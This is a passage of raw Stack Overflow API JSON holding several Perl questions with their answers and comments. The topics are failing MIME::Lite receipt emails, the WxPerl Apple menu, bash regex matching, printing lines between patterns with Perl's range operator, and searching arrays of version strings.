"last_activity_date": 1466486836, "creation_date": 1466486836, "question_id": 37936229, "link": "https://stackoverflow.com/questions/37936229/perl-email-failures", "title": "Perl email failures", "body": "<p>I created a website to handle event registration with PHP mysqli etc. Upon completing the form on user submit it goes to a payment gateway. Upon payment, the gateway would send a confirmation to a perl page I had created. </p>\n\n<p>In perl I would access the database, mark the registration as paid and send out a confirmation email. I was using MIME::Lite to send the email. My problem was that about 20% of receipt emails didn't seem to get sent...</p>\n\n<p>Does anyone know why this might be? I wondered if it was due to a high volume of users entering payment all at the same time....</p>\n\n<p>Is there a better way to send automatic emails? Should I store receipts in a DB then use something like cron to email batches? </p>\n\n<p>The code I used for emailing was something like the following....</p>\n\n<pre><code>my $receipt = MIME::Lite-&gt;new(\nTo =&gt; $emailAddress,\nBcc  =&gt; 'admin@test.org.au',\nFrom =&gt;'admin@test.org.au',\nSubject =&gt; 'registration',\nType =&gt;'multipart/related'\n);\n$receipt-&gt;attach(Type =&gt; 'text/html',\nData =&gt; qq {\n</code></pre>\n\n<p>eventualy culminating with </p>\n\n<pre><code>$receipt-&gt;send();\n</code></pre>\n\n<p>Thanks for the assist.</p>\n"}, {"tags": ["perl", "wxwidgets", "wxformbuilder"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466487669, "post_id": 37935575, "comment_id": 63322436, "body": "This may be a more generic question of how to integrate your GUI with the OS? I suspect you&#39;d have the same thing to resolve with Gtk+, say? So maybe search for that first, how to integrate your application, regardless of the toolkit."}], "owner": {"reputation": 338, "user_id": 4705722, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b0292cef8a0a90ed57d525ed015438eb?s=128&d=identicon&r=PG&f=1", "display_name": "sail0r", "link": "https://stackoverflow.com/users/4705722/sail0r"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 1, "answer_count": 0, "score": 2, "last_activity_date": 1466483076, "creation_date": 1466483076, "question_id": 37935575, "link": "https://stackoverflow.com/questions/37935575/how-to-program-the-apple-menu-bar-in-wxperl", "title": "how to program the apple menu bar in WxPerl?", "body": "<p>I am just starting out with WxPerl. I generated a simple frame with a button in wxformbuilder, generated the XRC, and successfully used the XRC in my Perl code. So far so good. </p>\n\n<p>Right now I am developing on OS X and I notice that the Apple menu becomes unresponsive when my Wx application runs. Also the menu next to the Apple menu is just \"perl\", it seems to default to whatever the application name is. If I just run a perl script it uses the name of the perl interpreter. Ok, fine. But how do I custumize the Apple menu bar items in WxPerl. My Google searches are totally useless on this one so far. Any pointers to further documentation or advice?</p>\n"}, {"tags": ["regex", "bash", "perl"], "comments": [{"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 3, "creation_date": 1466485162, "post_id": 37935415, "comment_id": 63321541, "body": "Running the code in an <code>INIT</code> block seems confusing and distracting.  If it&#39;s the contents of the block you want to have translated, just pare it down to that.  See also <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 845, "user_id": 2105790, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/ded7e22588e7875f480ecfe5453d83f6?s=128&d=identicon&r=PG", "display_name": "The Georgia", "link": "https://stackoverflow.com/users/2105790/the-georgia"}, "reply_to_user": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 0, "creation_date": 1466494204, "post_id": 37935415, "comment_id": 63325528, "body": "tripleee, iwant to implement the logic in bash, hence the use of the init in a perl script is not so important. So yes, just focus on the inner code content please."}], "answers": [{"comments": [{"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 2, "creation_date": 1466485082, "post_id": 37935476, "comment_id": 63321514, "body": "Huh? Bash has glob-based string substitution which is quite capable of solving this."}, {"owner": {"reputation": 23303, "user_id": 48382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/5CQEv.jpg?s=128&g=1", "display_name": "Krzysztof Kraso\u0144", "link": "https://stackoverflow.com/users/48382/krzysztof-kraso%c5%84"}, "reply_to_user": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 0, "creation_date": 1466485951, "post_id": 37935476, "comment_id": 63321795, "body": "The question asks about regexp, and I assumed bash doesn&#39;t have that, but as I can see from other responses it actually does. As for glob - those are not regexps as it was asked for in the title of question."}], "tags": [], "owner": {"reputation": 23303, "user_id": 48382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/5CQEv.jpg?s=128&g=1", "display_name": "Krzysztof Kraso\u0144", "link": "https://stackoverflow.com/users/48382/krzysztof-kraso%c5%84"}, "is_accepted": true, "score": 7, "last_activity_date": 1466485786, "last_edit_date": 1466485786, "creation_date": 1466482422, "answer_id": 37935476, "question_id": 37935415, "link": "https://stackoverflow.com/questions/37935415/bash-regex-string-variable-match/37935476#37935476", "title": "Bash regex string variable match", "body": "<p>You can use a tool for it e.g. <code>sed</code> if you want to stay with regexps:</p>\n\n<pre><code>#!/bin/sh\nstring=\"Seconds_Behind_Master: 1\"\ns=`echo $string | sed -r 's/Seconds_Behind_Master: ([0-9]+)/\\1/g'`\nif [ $s -gt 10 ]\nthen\n    echo \"Too long... $s\"\nelse\n    echo \"It's OK\"\nfi\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "is_accepted": false, "score": 2, "last_activity_date": 1466485397, "creation_date": 1466485397, "answer_id": 37935945, "question_id": 37935415, "link": "https://stackoverflow.com/questions/37935415/bash-regex-string-variable-match/37935945#37935945", "title": "Bash regex string variable match", "body": "<p>The specific case of \"more than a single digit\" is particularly easy with just a pattern match:</p>\n\n<pre><code>case $string in\n   *Seconds_Behind_Master: [1-9][0-9]*) echo Too long;;\n   *) echo OK;;\nesac\n</code></pre>\n\n<p>To emulate what your Perl code is doing more closely, you can extract the number with simple string substitutions.</p>\n\n<pre><code>s=${string##*Seconds_Behind_Master: }\ns=${s%%[!0-9]*}\n[ $s -gt 10 ] &amp;&amp; echo \"Too long: $s\" || echo OK.\n</code></pre>\n\n<p>These are glob patterns, not regular expressions; <code>*</code> matches any string, <code>[!0-9]</code> matches a single character which is not a digit.  All of this is Bourne-compatible, i.e. not strictly Bash only (you can use <code>/bin/sh</code> instead of <code>/bin/bash</code>).</p>\n"}, {"comments": [{"owner": {"reputation": 845, "user_id": 2105790, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/ded7e22588e7875f480ecfe5453d83f6?s=128&d=identicon&r=PG", "display_name": "The Georgia", "link": "https://stackoverflow.com/users/2105790/the-georgia"}, "edited": false, "score": 0, "creation_date": 1466501937, "post_id": 37935960, "comment_id": 63330449, "body": "xxfelixxx, i will test your solution too since it actually uses Regex in bash. Thank you all for your response."}], "tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": false, "score": 10, "last_activity_date": 1466485466, "creation_date": 1466485466, "answer_id": 37935960, "question_id": 37935415, "link": "https://stackoverflow.com/questions/37935415/bash-regex-string-variable-match/37935960#37935960", "title": "Bash regex string variable match", "body": "<p>You can use regular expression in bash, just like in perl.</p>\n\n<pre><code>#!/bin/bash\n\nSTRING=\"Seconds_Behind_Master: \"\n\nREGEX=\"Seconds_Behind_Master: ([0-9]+)\"\n\nRANGE=$( seq 8 12 )\n\nfor i in $RANGE; do\n    NEW_STRING=\"${STRING}${i}\"\n    echo $NEW_STRING;\n\n    [[ $NEW_STRING =~ $REGEX ]]\n    SECONDS=\"${BASH_REMATCH[1]}\"\n    if [ -n \"$SECONDS\" ]; then\n        if [[ \"$SECONDS\" -gt 10 ]]; then\n            echo \"Too Long...$SECONDS\"\n        else\n            echo \"OK\"\n        fi\n    else\n        echo \"ERROR: Failed to match '$NEW_STRING' with REGEX '$REGEX'\"\n    fi\ndone\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>Seconds_Behind_Master: 8\nOK\nSeconds_Behind_Master: 9\nOK\nSeconds_Behind_Master: 10\nOK\nSeconds_Behind_Master: 11\nToo Long...11\nSeconds_Behind_Master: 12\nToo Long...12\n</code></pre>\n\n<p><a href=\"https://www.gnu.org/software/bash/manual/bashref.html#index-BASH_005fREMATCH\" rel=\"noreferrer\">man bash #BASH_REMATCH</a></p>\n"}], "owner": {"reputation": 845, "user_id": 2105790, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/ded7e22588e7875f480ecfe5453d83f6?s=128&d=identicon&r=PG", "display_name": "The Georgia", "link": "https://stackoverflow.com/users/2105790/the-georgia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 17008, "favorite_count": 0, "accepted_answer_id": 37935476, "answer_count": 3, "score": 8, "last_activity_date": 1618621015, "creation_date": 1466482102, "last_edit_date": 1618621015, "question_id": 37935415, "link": "https://stackoverflow.com/questions/37935415/bash-regex-string-variable-match", "title": "Bash regex string variable match", "body": "<p>I have the following script i wrote in perl that works just fine. But i am trying to achieve the same thing using bash.</p>\n<pre><code>#!/usr/bin/perl\n\nuse 5.010;\nuse strict;\n\nINIT {\n    my $string = 'Seconds_Behind_Master: 1';\n    my ($s) = ($string =~ /Seconds_Behind_Master: ([\\d]+)/);\n    if ($s &gt; 10) {\n        print &quot;Too long... ${s}&quot;;\n    } else {\n        print &quot;It's ok&quot;;\n    }\n}\n\n__END__\n</code></pre>\n<p>How can i achieve this using a bash script? Basically, i want to be able to read and match the value at the end of the string &quot;Seconds_Behind_Master: N&quot; where N can be any value.</p>\n"}, {"tags": ["regex", "string", "perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466500983, "post_id": 37935282, "comment_id": 63329782, "body": "Is this how your input looks and what you want -- there&#39;s a line with, say, <code>t.4</code>, and then a bunch of other lines, then a line with <code>t.5</code>... you want that bunch of lines (plus <code>t.4</code>) to go to the file <code>clust(4).txt</code>.  Then the bunch that comes between <code>t.5</code> and <code>t.6</code> lines goes into file with <code>5</code> in its name, etc.  The lines in between have completely different text on them.  Is this all correct?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466503490, "post_id": 37935282, "comment_id": 63331567, "body": "I&#39;ve added a section to the post, doing what I now think you are asking."}], "answers": [{"comments": [{"owner": {"reputation": 1073, "user_id": 1039320, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/28ba137ea03056ffb3a2e6db49ac29cd?s=128&d=identicon&r=PG", "display_name": "jreisinger", "link": "https://stackoverflow.com/users/1039320/jreisinger"}, "edited": false, "score": 1, "creation_date": 1466508881, "post_id": 37935469, "comment_id": 63335118, "body": "To exclude (not print) the end marker you could also check the return value of the range operator. If the last two characters of the return value are &quot;E0&quot; than it is the end marker. So the check would be something like <code>next if $rv =~ &#47;E0$&#47;;</code> within the if statement block where <code>$rv</code> contains the return value of the range operator."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 7, "last_activity_date": 1558249755, "last_edit_date": 1558249755, "creation_date": 1466482374, "answer_id": 37935469, "question_id": 37935282, "link": "https://stackoverflow.com/questions/37935282/how-to-print-lines-in-between-two-patterns/37935469#37935469", "title": "How to print lines in between two patterns?", "body": "<p><strong>Update</strong>&nbsp; Re-arranged so that the version based on my final understanding of input comes first.  Also edited for clarity.</p>\n\n<hr>\n\n<p>Detect the line that starts the section to be written to its own file and open the suitable file; otherwise just write to the filehandle (that corresponds to the current output file).</p>\n\n<p>An example input file, in my understanding, <code>data_range.txt</code></p>\n\n<pre>\n@cluster t.1 has 100 elements\ndata 1\ndata 1 1\n@cluster t.2 has 200 elements\ndata 2\n@cluster t.3 has 300 elements\n</pre>\n\n<p>Print <code>t.N</code> and the lines following up to the next <code>t.N</code>, to a file <code>clust(N).txt</code>.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = shift || 'data_range.txt';\nopen my $fh, $file  or die \"Can't open $file: $!\";\n\nmy $fh_out;\n\nmy $clustline = qr/\\@cluster t\\.([0-9]+) has [0-9]+ elements/;\n\nwhile (&lt;$fh&gt;) \n{\n    if (/$clustline/) {\n        my $outfile = \"clust($1).txt\";\n        open $fh_out, '&gt;', $outfile or die \"Can't open $outfile: $!\";\n    }\n\n    print $fh_out $_;\n}\n</code></pre>\n\n<p>For each line with <code>@cluster</code> a new file with the corresponding number is opened, closing the previous one since we use the same filehandle. All following lines, including that one, belong to that file and they are printed there. </p>\n\n<p>The code above assumes that the first line in the file is a <code>@cluster</code> line, and that all lines in this file belong to one of output files. If this may not be so then we need to be more careful: (1) use a flag for when the writing starts and (2) add a branch that allows to skip lines.</p>\n\n<pre><code>my $started_writing = 0;\n\nmy $clustline = qr/\\@cluster t\\.([0-9]+) has [0-9]+ elements/;\n\nwhile (&lt;$fh&gt;) \n{\n    if (/$clustline/) {\n        my $fout = \"clust($1).txt\";\n        open $fh_out, '&gt;', $fout or die \"Can't open $fout for writing: $!\";\n        $started_writing = 1;\n    }\n    elsif (not $started_writing) {   # didn't get to open output files yet\n        next;\n    }\n    elsif (/dont_write_this_line/) { # condition for lines to skip altogether\n        next;\n    }\n\n    print $fh_out $_;\n}\n</code></pre>\n\n<p>All of this assumes that a <code>@cluster</code> line cannot repeat with the same number. You'd lose output data if that happened, so add a test if you aren't sure of your input (or open output files in append mode).</p>\n\n<p>With either we get output <code>clust(1).txt</code></p>\n\n<pre>\n@cluster t.1 has 100 elements\ndata 1\ndata 1 1\n</pre>\n\n<p>and <code>clust(2).txt</code></p>\n\n<pre>\n@cluster t.2 has 200 elements\ndata 2\n</pre>\n\n<p>and <code>clust(3).txt</code> with the <code>@cluster t.3</code> line.</p>\n\n<hr>\n\n<p><em>Original version, with the initial understanding of input and requirements</em></p>\n\n<p>The <a href=\"http://perldoc.perl.org/perlop.html#Range-Operators\" rel=\"nofollow noreferrer\">range operator</a> is nearly tailor made for this. It keeps track of its true/false state across repeated calls. It turns true once its left operand evaluates true and stays that way until the right one is true, <em>after</em> which it is false, so on the next evaluation. There is more to it, please see the docs.</p>\n\n<p>Made-up input file <code>data_range.txt</code></p>\n\n<pre>\n@cluster t.1 has 100 elements\n@cluster t.2 has 200 elements\n@cluster t.3 has 300 elements\n@cluster t.4 has 400 elements\n@cluster t.5 has 500 elements\n</pre>\n\n<p>Print everything between marker-lines 2 and 4, including the starting line but not the ending one.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = 'data_range.txt';\nopen my $fh, $file  or die \"Can't open $file: $!\";\n\n# Build the start and end patterns\nmy $beg = qr/^\\@cluster t\\.2 has 200 elements$/;\nmy $end = qr/^\\@cluster t\\.4 has 400 elements$/;\n\nwhile (&lt;$fh&gt;) \n{\n    if (/$beg/ .. /$end/) {\n        print if not /$end/;\n    }   \n}\n</code></pre>\n\n<p>This prints lines 2 and 3.  The <code>..</code> operator turns true once the line (<code>$_</code>) matches <code>$beg</code> and is true until a line matches <code>$end</code>. After that it is false, for the next line. Thus it ends up including both start and end lines as well. So we also test for the end marker, and not print if we have that line.</p>\n\n<p>If you would rather use the literal marker lines you can test strings for equality</p>\n\n<pre><code>my $beg = q(@cluster t.2 has 200 elements);\nmy $end = q(@cluster t.4 has 400 elements);\n\nwhile (my $line = &lt;$fh&gt;) \n{\n    chomp($line);\n    if ($line eq $beg .. $line eq $end) {\n        print \"$line\\n\" if $line ne $end;\n    }   \n}\n</code></pre>\n\n<p>This works the same way as the example above.  Note that now we have to <code>chomp</code> since the newline would foil <code>eq</code> test (and then we add <code>\\n</code> for printing).</p>\n"}, {"comments": [{"owner": {"reputation": 4537, "user_id": 55478, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/afabf46907945f8cb024149f9f69fb6e?s=128&d=identicon&r=PG", "display_name": "Noah Sussman", "link": "https://stackoverflow.com/users/55478/noah-sussman"}, "edited": false, "score": 1, "creation_date": 1569528046, "post_id": 48778243, "comment_id": 102636500, "body": "Thanks. This is a much more concise solution than the accepted answer."}], "tags": [], "owner": {"reputation": 142005, "user_id": 465183, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/3b518a0ea4c992cfe9965671d0139ba4?s=128&d=identicon&r=PG", "display_name": "Gilles Quenot", "link": "https://stackoverflow.com/users/465183/gilles-quenot"}, "is_accepted": false, "score": 3, "last_activity_date": 1569620218, "last_edit_date": 1569620218, "creation_date": 1518570928, "answer_id": 48778243, "question_id": 37935282, "link": "https://stackoverflow.com/questions/37935282/how-to-print-lines-in-between-two-patterns/48778243#48778243", "title": "How to print lines in between two patterns?", "body": "<p>I have a more concise way to provide :</p>\n\n<pre><code>perl -ne 'print if /^foo/ .. /^base/' file.txt\n</code></pre>\n\n<h1>Sample input</h1>\n\n<pre><code>Lorem ipsum dolor\nsit amet,\nconsectetur adipiscing\nfoo\nbar\nbase\nelit,\nsed do\n</code></pre>\n\n<h2>Output</h2>\n\n<pre><code>foo\nbar\nbase\n</code></pre>\n"}], "owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4013, "favorite_count": 0, "accepted_answer_id": 37935469, "answer_count": 2, "score": 4, "last_activity_date": 1569620218, "creation_date": 1466481298, "last_edit_date": 1558329843, "question_id": 37935282, "link": "https://stackoverflow.com/questions/37935282/how-to-print-lines-in-between-two-patterns", "title": "How to print lines in between two patterns?", "body": "<p>I would like to print everything between lines <code>@cluster t.# has ### elements</code> (including this line) and <code>@cluster t.#+1 has ### elements</code> (preferably omitting this line) from my input file into corresponding numbered output files (<code>clust(#).txt</code>). The script thus far creates the appropriate numbered files, without any content. </p>\n\n<pre><code>#!/usr/bin/perl \n\nuse strict;\nuse warnings;\n\nopen(IN,$ARGV[0]);\n\nour $num = 0;\n\nwhile(my $line = &lt;IN&gt;) {\n    if ($line =~ /^\\@cluster t has (\\d+) elements/) {\n        my $clust = \"full\";\n        open (OUT, \"&gt;clust$clust.txt\");\n\n    } elsif ($line =~ m/^\\@cluster t.(\\d+.*) has (\\d+) elements/) {\n        my $clust = $1;\n        $num++;\n        open (OUT, \"&gt;clust$clust.txt\");\n        print OUT, $_ if (/$line/ ... /$line/);\n    }\n}\n</code></pre>\n"}, {"tags": ["arrays", "perl", "search"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466459265, "post_id": 37932149, "comment_id": 63315274, "body": "So if you&#39;re searching for version <code>6.1.5</code> you want to find the <i>earlier</i> version <code>6.1.4</code> instead of the lowest version equal to or greater than <code>6.1.5</code> or later? That&#39;s unusual.Do they always have three fields (or is <code>16.1</code> possible?). How do you read this data into the Perl program?"}, {"owner": {"reputation": 479, "user_id": 3595231, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5451a5e41eae7299deb485e11dc5041?s=128&d=identicon&r=PG&f=1", "display_name": "user3595231", "link": "https://stackoverflow.com/users/3595231/user3595231"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466459995, "post_id": 37932149, "comment_id": 63315543, "body": "yes, if the target is 16.1.5, and it is not included in this array, we would return the index of &quot;16.1.4&quot;."}, {"owner": {"reputation": 479, "user_id": 3595231, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5451a5e41eae7299deb485e11dc5041?s=128&d=identicon&r=PG&f=1", "display_name": "user3595231", "link": "https://stackoverflow.com/users/3595231/user3595231"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466460116, "post_id": 37932149, "comment_id": 63315585, "body": "And there is no item of &quot;16.1&quot; within that array.  The original data is just an String array."}], "answers": [{"comments": [{"owner": {"reputation": 479, "user_id": 3595231, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5451a5e41eae7299deb485e11dc5041?s=128&d=identicon&r=PG&f=1", "display_name": "user3595231", "link": "https://stackoverflow.com/users/3595231/user3595231"}, "edited": false, "score": 0, "creation_date": 1466461684, "post_id": 37932510, "comment_id": 63316110, "body": "Thanks a lot, This looks much better than I had implemented !"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1467554618, "last_edit_date": 1467554618, "creation_date": 1466460010, "answer_id": 37932510, "question_id": 37932149, "link": "https://stackoverflow.com/questions/37932149/searching-an-array-of-version-numbers-in-perl/37932510#37932510", "title": "Searching an array of version numbers in Perl", "body": "<p>Perl supports a data type called <a href=\"http://perldoc.perl.org/perldata.html#Scalar-value-constructors\" rel=\"nofollow\"><em>version strings</em></a>, which packs a version number as a string with a sequence of code points. For instance, <code>v1.2.3</code> would be represented as the string <code>\"\\x1\\x2\\x3\"</code></p>\n\n<p>You can create such a string by using <code>v</code> followed by a dotted-decimal sequence, or any dotted-decimal sequence with two or more dots will be treated the same way, even without the <code>v</code></p>\n\n<p>So we can solve your problem very simply by using version strings in combination with the <code>first_index</code> function from <a href=\"https://metacpan.org/pod/List::MoreUtils\" rel=\"nofollow\"><code>List::MoreUtils</code></a>, like this</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse List::MoreUtils 'first_index';\n\nmy @versions = ( v16.3.1, v16.2.5, v16.1.4, v15.3.5, v15.1.1 );\n\nfor my $target ( v16.1.4, v16.1.5 ) {\n  say first_index { $_ le $target } @versions;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>2\n2\n</code></pre>\n\n<p>There may be a problem with getting the version strings into your program in the first place, which is why I asked how you currently read them. But it's really no big issue if you explain what you need</p>\n\n<p><br/></p>\n\n<hr>\n\n<h3>Update</h3>\n\n<p>I've changed my answer to use <code>v16.1.4</code>, <code>v16.1.5</code>etc. It worked fine before, but it's less than obvious that <code>16.1.4</code> is a completely different literal from the floating-point value  <code>16.1</code>. On the other hand, <code>v16.1.4</code> and <code>v16.1</code> are both version strings</p>\n\n<p>You also don't really say where your input comes from. Fair enough, you can declare a literal array of versions, as I have in my answer, but presumably your <code>$target</code> won't also be a literal, otherwise there's little point in writing the program in the first place</p>\n\n<p>I hoped you would talk about where these things were coming from so that I could help you, but you probably need to look at the <a href=\"https://metacpan.org/pod/version\" rel=\"nofollow\"><code>version</code></a> pragma, which offers class methods that will convert between ordinary strings and version strings</p>\n\n<p>For example, if the target was supplied as a string you could use <code>version-&gt;parse</code> to convert it to a version string, which means the final loop above would look like this</p>\n\n<pre><code>use version;\n\nfor my $target ( \"16.1.5\", \"16.1.4\" ) {\n    my $vs = version-&gt;parse($target);\n    say first_index { $_ le $vs } @versions;\n}\n</code></pre>\n\n<p>So <code>version-&gt;parse(\"16.1.4\") eq v16.1.4</code> is always <em>true</em></p>\n\n<p>I hope that has clarified rather than confused</p>\n"}, {"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1466517300, "post_id": 37932978, "comment_id": 63341474, "body": "+1 I am allergic to vstrings. This answer, recommending the use of <code>first_index</code> for short lists and binary search for long ones, is spot on. However, given that the OP&#39;s strings are well-ordered under string comparison, I don&#39;t think the additional <code>make_key</code> step is necessary. Is the speed advantage of a numeric comparison going to be swamped by the function call? I did not check."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1466519575, "post_id": 37932978, "comment_id": 63343343, "body": "@Sinan &#220;n&#252;r, Yes, the difference in speed between these solutions is not that going to be that great, which is why I posted them all. The best optimization here is one I&#39;ve already suggested: Using a binary search for long lists of versions. If there are 1000 versions, you need to perform at most 10 checks to find the desired version, whereas it might take up to a 1000 using <code>first_index</code>."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1466519459, "last_edit_date": 1466519459, "creation_date": 1466462663, "answer_id": 37932978, "question_id": 37932149, "link": "https://stackoverflow.com/questions/37932149/searching-an-array-of-version-numbers-in-perl/37932978#37932978", "title": "Searching an array of version numbers in Perl", "body": "<p>Your solution will basically have the following form:</p>\n\n<pre><code>use List::MoreUtils qw( first_index );\n\nmy @versions = qw( 16.3.1 16.2.5 16.1.4 15.3.5 15.1.1 );\nmy $target = '16.1.4';\n\nmy $target_key = make_key($target);\nmy $index = first_index { make_key($_) &lt;= $target_key } @versions;\n</code></pre>\n\n<p>For long lists, you'd use a binary search instead.</p>\n\n<p>The previously posted solution assumes you are starting from hardcoded values, whereas this one demonstrates how to start from strings of any origin.</p>\n\n<hr>\n\n<p>All you need now is a way to generate a key that's easily comparable with string or numerical comparison operators. The following are sorted from fastest to slowest:</p>\n\n<pre><code># Use numerical comparison functions (&lt;=).\nsub make_key {\n   my @parts = split(/\\./, $_[0]);\n   return ( $parts[0] * 4 + $parts[1] ) * 6 + $parts[2];\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code># Use string comparison functions (le).\nsub make_key {\n   my $key = '';\n   $key .= chr($_) for split(/\\./, $_[0]);\n   return $key;\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>use Sort::Key::Natural qw( mkkey_natural );\n\n# Use string comparison functions (le).\nsub make_key { mkkey_natural($_[0]) }\n</code></pre>\n\n<p>The first solution is an implementation of what formula you suggested.</p>\n\n<p>The second solution is similar to <code>version-&gt;parse</code>, but without all the overhead and special cases you don't need.</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": 